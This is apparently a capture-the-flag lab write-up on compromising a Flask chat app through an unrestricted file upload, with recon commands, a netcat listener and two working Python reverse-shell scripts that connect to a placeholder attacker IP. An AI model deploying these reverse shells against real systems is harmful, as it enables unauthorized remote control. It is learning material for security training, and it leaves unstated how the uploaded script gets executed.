# Speed chat - CTF

**Target:** 10.49.156.222<br>
**Difficulty:** Easy<br>
**Vulnerability:** Remote code execution in upload functionality

---

## Step 1: Reconnaissance

### 1.1 Network Scanning
Identify open ports and services on the target:
```bash
sudo nmap -sC -sV 10.49.156.222
```
**Results:**
- port 22 (SSH)
- port 5000 (Flask Web Application)

**Analysis:** Port 5000 is running HTTP. This is the target application.

### 1.2 Web Application Enumeration
Visit the application in a browser: `http://10.49.156.222:5000` or use `curl`
```bash
curl -i http://10.49.156.222:5000
```
**Observation:** Opened the website, then saw a message section at right and a upload section for photo at left. So i uploaded a php file to see if there are any restrictions for file upload. File is uploaded. So RCE is possible.

### 1.3 Directory Enumeration
Perform directory brute-forcing to discover endpoints:
```bash
ffuf -u http://10.49.156.222:5000/FUZZ -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt
```
**Results:** Nothing

## Step 2: Exploitation

**Approach:** Trying RCE for it.

### 2.1 Creating a python script for reverse shell

#### Version 2.1.1 (01)
```python
#!/bin/python3

import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", <PORT>))

while True:
        cmd = s.recv(1024).decode("utf-8", errors="replace").strip()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        s.send((output + "\n").encode())
```

#### Version 2.1.2 (10)

```python
#!/usr/bin/python3

import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", <PORT>))

sock_fd = s.fileno()

os.dup2(sock_fd, 0)
os.dup2(sock_fd, 1)
os.dup2(sock_fd, 2)

proc = subprocess.Popen("/bin/bash")
proc.wait()
```

**NOTE:** I used both versions, but its better to get a shell which I did in Version 2.1.2 (10). **WHY?** Because getting that is more reliable and stable, while the first version **v2.1.1 (01)** is not reliable, and connection getting dropped multiple times, so we have to retrive the flag fast and upload the file multiple times.

#### Setting up a listener
On the terminal, run:
```bash
nc -lnvp <PORT_NUMBER>
```

After setting up the listener, upload the file in the website and we will get a connection in the output of `netcat`, indicating that we have achieved a reverse shell.

### 2.2 Command execution and Flag retrieval
After getting the reverse shell, i used some commands for system reconnaissance. Use commands like `whoami`, `pwd` and `ls`.
```bash
pwd
whoami
ls -l
cat flag.txt
```

---
**Total Time to Compromise:** ~30 minutes  
**Total Commands Executed:** ~10 

**Key learnings:**
- Quickly identified the upload functionality as the primary attack surface
- Initial reconnaissance wasted time testing PHP payloads before confirming the backend technology. Match payload language to backend technology